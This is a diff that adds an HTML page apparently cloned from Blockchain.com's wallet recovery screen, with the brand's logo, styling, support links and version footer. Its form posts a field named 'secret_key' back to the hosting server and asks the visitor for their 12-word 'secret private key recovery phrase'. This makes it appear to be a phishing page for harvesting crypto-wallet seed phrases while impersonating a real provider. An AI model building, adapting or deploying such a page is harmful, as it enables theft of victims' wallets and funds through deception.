@@ -1,0 +1,892 @@
+<html lang="en">
+<head>
+    <style>body {
+            font-size: 16px;
+        }</style>
+    <style>
+        body, #app, #app > div {
+            padding: 0;
+            margin: 0;
+            height: 100%;
+        }
+
+        body {
+            background-color: rgb(18, 29, 51);
+            overflow: hidden;
+        }
+
+        ::-webkit-scrollbar {
+            display: none;
+        }
+
+        * {
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .ixijk {
+            width: auto;
+            height: 24px;
+        }
+
+        .bzateK {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgb(12, 108, 242);
+            text-transform: none;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .bzateK:hover {
+            color: rgb(12, 108, 242);
+        }
+
+        .bzateK:focus {
+            text-decoration: none;
+        }
+
+        .ecJsZh {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            color: rgb(152, 161, 178);
+            text-transform: none;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .ecJsZh:hover {
+            color: rgb(152, 161, 178);
+        }
+
+        .ecJsZh:focus {
+            text-decoration: none;
+        }
+
+        .ixOYeY {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            color: rgb(12, 108, 242);
+            text-transform: none;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .ixOYeY:hover {
+            color: rgb(12, 108, 242);
+        }
+
+        .ixOYeY:focus {
+            text-decoration: none;
+        }
+
+        .cHKfSC {
+            -webkit-font-smoothing: antialiased;
+            cursor: inherit;
+            display: flex;
+        }
+
+        .cHKfSC::before {
+            font-family: icomoon, sans-serif;
+            content: "";
+        }
+
+        .koDvea {
+            -webkit-font-smoothing: antialiased;
+            cursor: pointer;
+            display: flex;
+        }
+
+        .koDvea::before {
+            font-family: icomoon, sans-serif;
+            content: "";
+        }
+
+        .hLxhAA {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-weight: 500;
+            font-size: 16px;
+            line-height: inherit;
+            text-transform: none;
+            font-style: normal;
+            color: rgb(152, 161, 178);
+            cursor: inherit;
+            display: block;
+            opacity: 1;
+        }
+
+        .gFCRIM {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-weight: 500;
+            font-size: 14px;
+            line-height: inherit;
+            text-transform: none;
+            font-style: normal;
+            color: rgb(18, 29, 51);
+            cursor: pointer;
+            display: block;
+            opacity: 1;
+        }
+
+        .iVtkAS {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-weight: 500;
+            font-size: 12px;
+            line-height: 1.5;
+            text-transform: none;
+            font-style: normal;
+            color: rgb(103, 113, 132);
+            cursor: inherit;
+            display: block;
+            opacity: 1;
+        }
+
+        .dZiTwf {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-weight: 500;
+            font-size: 16px;
+            line-height: inherit;
+            text-transform: none;
+            font-style: normal;
+            color: rgb(103, 113, 132);
+            cursor: inherit;
+            display: block;
+            opacity: 1;
+        }
+
+        .BCruu {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-weight: 600;
+            font-size: 16px;
+            line-height: 1.5;
+            text-transform: none;
+            font-style: normal;
+            color: rgb(18, 29, 51);
+            cursor: inherit;
+            display: block;
+            opacity: 1;
+        }
+
+        .jPqPHm {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-weight: 500;
+            font-size: 14px;
+            line-height: 1.5;
+            text-transform: none;
+            font-style: normal;
+            color: rgb(103, 113, 132);
+            cursor: inherit;
+            display: block;
+            opacity: 1;
+        }
+
+        .edfwkt {
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-weight: 600;
+            font-size: 16px;
+            line-height: inherit;
+            text-transform: none;
+            font-style: normal;
+            color: rgba(255, 255, 255, 0.9);
+            cursor: inherit;
+            display: block;
+            opacity: 1;
+        }
+
+        .grufYx {
+            display: flex;
+            flex-direction: row;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            width: 100%;
+            min-width: 140px;
+            height: 48px;
+            padding: 10px 15px;
+            box-sizing: border-box;
+            user-select: none;
+            text-align: center;
+            text-decoration: none;
+            vertical-align: middle;
+            letter-spacing: normal;
+            transition: all 0.2s ease-in-out 0s;
+            white-space: nowrap;
+            line-height: 1;
+            text-transform: none;
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            opacity: 1;
+            color: rgb(255, 255, 255);
+            background-color: rgb(12, 108, 242);
+            border-radius: 8px;
+            border-style: solid;
+            border-width: 1px;
+            border-color: rgb(12, 108, 242);
+        }
+
+        .grufYx:hover {
+            border-color: rgb(10, 86, 193);
+            background-color: rgb(10, 86, 193);
+        }
+
+        .grufYx:focus {
+            outline: 0;
+        }
+
+        .kXiRmv {
+            display: inline-flex;
+            text-transform: none;
+            position: relative;
+        }
+
+        .kyfudT {
+            display: inline-flex;
+            flex-direction: row;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            cursor: pointer;
+            width: inherit;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .kyfudT > * {
+            color: rgb(152, 161, 178) !important;
+        }
+
+        .kPtlNs {
+            display: inline;
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        }
+
+        .csAZWy {
+            margin-left: 4px;
+            font-weight: 600;
+        }
+
+        .jxbiXh {
+            background-clip: padding-box;
+            background-color: rgb(255, 255, 255);
+            border: 1px solid rgb(240, 242, 247);
+            border-radius: 4px;
+            box-shadow: rgba(0, 0, 0, 0.176) 0 6px 12px;
+            display: none;
+            float: none;
+            height: auto;
+            width: inherit;
+            line-height: 20px;
+            list-style: outside none none;
+            margin: 2px 0;
+            max-height: 230px;
+            min-width: 20px;
+            overflow: auto;
+            padding: 5px 0;
+            position: absolute;
+            left: 0;
+            top: auto;
+            bottom: 25px;
+            z-index: 10;
+        }
+
+        .gPmVSj {
+            color: rgb(53, 63, 82);
+            cursor: pointer;
+            padding: 3px 20px;
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-align: left;
+            text-size-adjust: 100%;
+            white-space: nowrap;
+        }
+
+        .gPmVSj:hover {
+            color: rgb(12, 108, 242);
+        }
+
+        .flbxTH {
+            display: block;
+            width: 100%;
+            height: 48px;
+            min-height: 48px;
+            padding: 6px 12px;
+            box-sizing: border-box;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgb(53, 63, 82);
+            background-color: rgb(255, 255, 255);
+            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            background-image: none;
+            outline-width: 0;
+            user-select: text;
+            border: 1px solid rgb(223, 227, 235);
+            border-radius: 8px;
+        }
+
+        .flbxTH:focus {
+            border: 1px solid rgb(12, 108, 242);
+        }
+
+        .flbxTH:focus::-webkit-input-placeholder {
+            opacity: 0.25;
+        }
+
+        .flbxTH:focus::placeholder {
+            opacity: 0.25;
+        }
+
+        .flbxTH::-webkit-input-placeholder {
+            color: rgb(152, 161, 178);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .flbxTH::placeholder {
+            color: rgb(152, 161, 178);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .flbxTH:disabled {
+            cursor: not-allowed;
+            background-color: rgb(223, 227, 235);
+            border: 1px solid transparent;
+        }
+
+        .Pbjyv {
+            display: flex;
+            width: 100%;
+            -webkit-box-align: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .jSqxFK {
+            position: absolute;
+            display: flex;
+            flex-direction: column-reverse;
+            -webkit-box-pack: start;
+            justify-content: flex-start;
+            align-items: flex-start;
+            z-index: 1050;
+        }
+
+        @media (max-width: 768px) {
+            .jSqxFK {
+                bottom: 10px;
+                right: 10px;
+                width: 95%;
+            }
+        }
+
+        @media (min-width: 769px) {
+            .jSqxFK {
+                top: 65px;
+                right: 22px;
+                width: auto;
+            }
+        }
+
+        .ilHcgz {
+            display: inline-flex;
+            cursor: pointer;
+        }
+
+        .jhqRYo {
+            margin-top: 4px;
+            margin-left: 16px;
+            margin-right: 16px;
+        }
+
+        .kiwhRw {
+            padding: 2rem 2rem 0;
+        }
+
+        .jnHNPG {
+            display: flex;
+            padding-left: 24px;
+            -webkit-box-align: center;
+            align-items: center;
+            width: 250px;
+        }
+
+        @media (max-width: 992px) {
+            .jnHNPG {
+                width: 200px;
+                padding-left: 0;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .jnHNPG {
+                width: auto;
+            }
+        }
+
+        .dHvbOZ {
+            width: 100%;
+            height: 112px;
+            margin: 0 auto;
+            background-color: rgb(18, 29, 51);
+        }
+
+        .iTjCBV {
+            position: relative;
+            display: flex;
+            flex-direction: row;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+            -webkit-box-align: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+            background-color: inherit;
+        }
+
+        .cptUIt {
+            padding: 0 16px;
+            box-sizing: border-box;
+            background-color: rgb(18, 29, 51);
+            background-image: url(img/bg-pattern.svg);
+        }
+
+        .fCMSDs {
+            display: flex;
+            flex-direction: row;
+            width: 100%;
+            -webkit-box-pack: center;
+            justify-content: center;
+            padding-left: 0;
+        }
+
+        .kyMJXT {
+            width: 240px;
+            display: block;
+        }
+
+        @media (max-width: 768px) {
+            .kyMJXT {
+                width: 200px;
+            }
+        }
+
+        .kKyXUB {
+            display: flex;
+            flex-direction: row;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        .gqnaJW {
+            display: flex;
+            flex-direction: row;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        .ilwOTt {
+            display: flex;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            flex-direction: column;
+            width: 100%;
+            margin: 6rem 0 2rem;
+        }
+
+        @media (max-width: 480px) {
+            .ilwOTt {
+                flex-direction: column;
+                margin-top: 8px;
+            }
+        }
+
+        .hLRBsB {
+            background-color: rgb(18, 29, 51);
+            height: auto;
+            min-height: 100%;
+            width: 100%;
+            overflow: auto;
+        }
+
+        @media (min-width: 769px) {
+            .hLRBsB {
+                display: flex;
+                flex-direction: column;
+                -webkit-box-align: center;
+                align-items: center;
+                height: 100%;
+            }
+
+            .hLRBsB > div:last-child {
+                margin-top: auto;
+            }
+        }
+
+        .fvHjxE {
+            position: relative;
+            width: 100%;
+        }
+
+        .dXnSGZ {
+            display: flex;
+            flex-direction: column;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            z-index: 1;
+            max-width: 100%;
+            box-sizing: border-box;
+            margin: 0 16px;
+        }
+
+        .kaDnHw {
+            width: 100%;
+        }
+
+        .fPdPcy {
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        .blHUpu {
+            border-radius: 8px;
+            box-sizing: border-box;
+            background-color: rgb(255, 255, 255);
+            box-shadow: rgba(0, 0, 0, 0.21) 0 2px 8px 0;
+            width: 480px;
+            padding: 24px 0;
+        }
+
+        @media (max-width: 768px) {
+            .blHUpu {
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .blHUpu {
+                padding: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .blHUpu {
+                padding: 16px 0;
+            }
+        }
+
+        .kXZNIj {
+            padding: 0 32px;
+        }
+
+        @media (max-width: 480px) {
+            .kXZNIj {
+                padding: 0 16px;
+            }
+        }
+
+        .hJXYdn {
+            display: flex;
+            -webkit-box-pack: center;
+            justify-content: center;
+            margin-top: 24px;
+            border-top: 1px solid rgb(240, 242, 247);
+            padding: 0;
+        }
+
+        @media (max-width: 480px) {
+            .hJXYdn {
+                flex-direction: column;
+                -webkit-box-align: center;
+                align-items: center;
+            }
+        }
+
+        .jrOiAP {
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        @media (max-width: 480px) {
+            .jrOiAP {
+                flex-direction: column;
+                -webkit-box-align: center;
+                align-items: center;
+            }
+        }
+
+        .jEqsgd {
+            margin-top: 16px;
+            cursor: pointer;
+        }
+
+        @media (max-width: 480px) {
+            .jEqsgd {
+                margin-top: 0;
+            }
+        }
+
+        .jEqsgd:hover {
+            font-weight: 600;
+        }
+
+        .hRoxjW {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            -webkit-box-pack: end;
+            justify-content: flex-end;
+            align-items: flex-start;
+            width: 100%;
+            height: 48px;
+        }
+
+        .cnfdVu {
+            display: flex;
+            flex-direction: column;
+        }
+
+        *, ::before, ::after {
+            --tw-border-spacing-x: 0;
+            --tw-border-spacing-y: 0;
+            --tw-translate-x: 0;
+            --tw-translate-y: 0;
+            --tw-rotate: 0;
+            --tw-skew-x: 0;
+            --tw-skew-y: 0;
+            --tw-scale-x: 1;
+            --tw-scale-y: 1;
+            --tw-scroll-snap-strictness: proximity;
+            --tw-ring-offset-width: 0px;
+            --tw-ring-offset-color: #fff;
+            --tw-ring-color: rgb(147 197 253 / 0.5);
+            --tw-ring-offset-shadow: 0 0 #0000;
+            --tw-ring-shadow: 0 0 #0000;
+            --tw-shadow: 0 0 #0000;
+            --tw-shadow-colored: 0 0 #0000;
+        }
+
+        *, ::before, ::after {
+            --tw-border-spacing-x: 0;
+            --tw-border-spacing-y: 0;
+            --tw-translate-x: 0;
+            --tw-translate-y: 0;
+            --tw-rotate: 0;
+            --tw-skew-x: 0;
+            --tw-skew-y: 0;
+            --tw-scale-x: 1;
+            --tw-scale-y: 1;
+            --tw-scroll-snap-strictness: proximity;
+            --tw-ring-offset-width: 0px;
+            --tw-ring-offset-color: #fff;
+            --tw-ring-color: rgb(147 197 253 / 0.5);
+            --tw-ring-offset-shadow: 0 0 #0000;
+            --tw-ring-shadow: 0 0 #0000;
+            --tw-shadow: 0 0 #0000;
+            --tw-shadow-colored: 0 0 #0000;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-Thin.woff2) format("woff2");
+            font-weight: 100;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-ExtraLight.woff2) format("woff2");
+            font-weight: 200;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-Light.woff2) format("woff2");
+            font-weight: 300;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-Medium.woff2) format("woff2");
+            font-weight: 500;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-Regular.woff2) format("woff2");
+            font-weight: 400;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-SemiBold.woff2) format("woff2");
+            font-weight: 600;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-ExtraBold.woff2) format("woff2");
+            font-weight: 800;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-Bold.woff2) format("woff2");
+            font-weight: 700;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-Black.woff2) format("woff2");
+            font-weight: 900;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: Inter;
+            src: url(fonts/Inter-BlackItalic.woff2) format("woff2");
+            font-weight: 900;
+            font-style: normal;
+            font-stretch: normal;
+        }
+
+        @font-face {
+            font-family: icomoon;
+            src: url(fonts/icomoon.ttf) format("truetype");
+            font-weight: normal;
+            font-style: normal;
+            font-stretch: normal;
+        }</style>
+    <title>Blockchain.com | Recover</title>
+    <link rel="shortcut icon" href="img/favicon.ico">
+</head>
+<body class="mode-light">
+<div id="app">
+    <div class="sc-eInJlc hLRBsB" style="">
+        <div class="sc-esOvli jSqxFK"></div>
+        <div class="sc-gtfDJT fvHjxE">
+            <div height="112px" class="sc-fZwumE dHvbOZ">
+                <div class="sc-fQejPQ iTjCBV sc-clNaTc cptUIt">
+                    <div class="sc-bnXvFD jnHNPG sc-etwtAo fCMSDs">
+                        <div class="sc-iGPElx kKyXUB"><a href="https://www.blockchain.com"
+                                                         class="sc-htpNat bzateK sc-kasBVs gqnaJW" color="blue600"><img
+                                        src="img/bc-logo.svg"
+                                        srcset="img/bc-logo.svg" height="24px"
+                                        class="sc-bwzfXH ixijk sc-jXQZqI kyMJXT" color="auto" width="auto" alt=""></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="sc-fOICqy dXnSGZ">
+            <form class="sc-jKmXuR kaDnHw" method="post">
+                <div class="sc-bYwvMP sc-jMMfwr blHUpu">
+                    <div class="sc-jGxEUC kXZNIj">
+                        <div class="sc-ecaExY fPdPcy" style="margin-bottom: 16px;"><span data-e2e="recoverBack"
+                                                                                         color="blue600" role="button"
+                                                                                         class="sc-bxivhb koDvea"
+                                                                                         style="color: rgb(12, 108, 242); font-size: 24px; font-weight: 400; margin-right: 4px;"></span>
+                            <div color="grey900" cursor="pointer" opacity="1" class="sc-gzVnrw gFCRIM">Back</div>
+                        </div>
+                        <div class="sc-gacfCG cnfdVu">
+                            <div color="grey900" cursor="inherit" opacity="1" class="sc-gzVnrw BCruu"
+                                 style="margin-bottom: 8px;">Input your secret private key recovery phrase
+                            </div>
+                            <div color="grey600" cursor="inherit" opacity="1" class="sc-gzVnrw iVtkAS"
+                                 style="margin-bottom: 16px;">Your 12 word Secret Private Key Recovery Phrase grants
+                                access to your account. Please input it in the order specified.
+                            </div>
+                            <div class="sc-bIqbHp hRoxjW" height="48px">
+                                <div class="sc-jhAzac Pbjyv"><input name="secret_key" autocomplete="off" height="48px"
+                                                                    placeholder="Enter your secret private key recovery phrase"
+                                                                    spellcheck="false" type="text"
+                                                                    class="sc-hzDkRC flbxTH"
+                                                                    value=""
+                                                                    aria-label="Enter your secret private key recovery phrase">
+                                </div>
+                            </div>
+                        </div>
+                        <div color="grey600" cursor="inherit" opacity="1" class="sc-gzVnrw jPqPHm"
+                             style="margin: 8px 0 24px; text-align: center;">Separate each word with a space
+                        </div>
+                        <button type="submit" height="48px" data-e2e="submitRecoveryPhrase" color="white"
+                                class="sc-gqjmRU grufYx" style="margin-bottom: 16px;">
+                            <div color="whiteFade900" cursor="inherit" opacity="1" class="sc-gzVnrw edfwkt">Continue
+                            </div>
+                        </button>
+                    </div>
+                    <div class="sc-jdeSqf hJXYdn">
+                        <div class="sc-cBrjTV jrOiAP">
+                            <div color="grey600" cursor="inherit" opacity="1" class="sc-gzVnrw dZiTwf"
+                                 style="cursor: pointer; margin-top: 16px;">Trouble Logging In?
+                            </div>&nbsp;<a target="_blank" href="https://support.blockchain.com/"
+                                           class="sc-htpNat ixOYeY sc-iCwjlJ jEqsgd" color="blue600"
+                                           style="margin-left: 2px;">Contact Support</a></div>
+                    </div>
+                </div>
+            </form>
+        </div>
+        <div class="sc-hgHYgh ilwOTt">
+            <div class="sc-eLExRp kiwhRw">
+                <div class="sc-kGXeez kXiRmv">
+                    <ul class="sc-jKJlTe jxbiXh">
+                        <li class="sc-eNQAEJ gPmVSj">English</li>
+                        <li class="sc-eNQAEJ gPmVSj">Español</li>
+                        <li class="sc-eNQAEJ gPmVSj">Français</li>
+                        <li class="sc-eNQAEJ gPmVSj">Português</li>
+                        <li class="sc-eNQAEJ gPmVSj">Türkçe</li>
+                        <li class="sc-eNQAEJ gPmVSj">Русский</li>
+                    </ul>
+                    <div color="grey400" class="sc-kpOJdX kyfudT">
+                        <div class="sc-dxgOiQ kPtlNs">English</div>
+                        <span class="sc-bxivhb cHKfSC sc-ckVGcZ csAZWy"
+                              style="font-size: 12px; font-weight: 400;"></span></div>
+                </div>
+                <span class="sc-lkqHmb jhqRYo"><a color="grey400"
+                                                  href="https://github.com/blockchain/blockchain-wallet-v4-frontend/releases"
+                                                  target="_blank" class="sc-htpNat ecJsZh">Version 4.76.8</a></span>
+                <div class="sc-gojNiO ilHcgz"><a color="grey400" href="https://support.blockchain.com" target="_blank"
+                                                 class="sc-htpNat ecJsZh">
+                        <div color="grey400" cursor="inherit" opacity="1" class="sc-gzVnrw hLxhAA">Need Help?</div>
+                    </a></div>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="contact-chat-portal"></div>
+</body>
+</html>
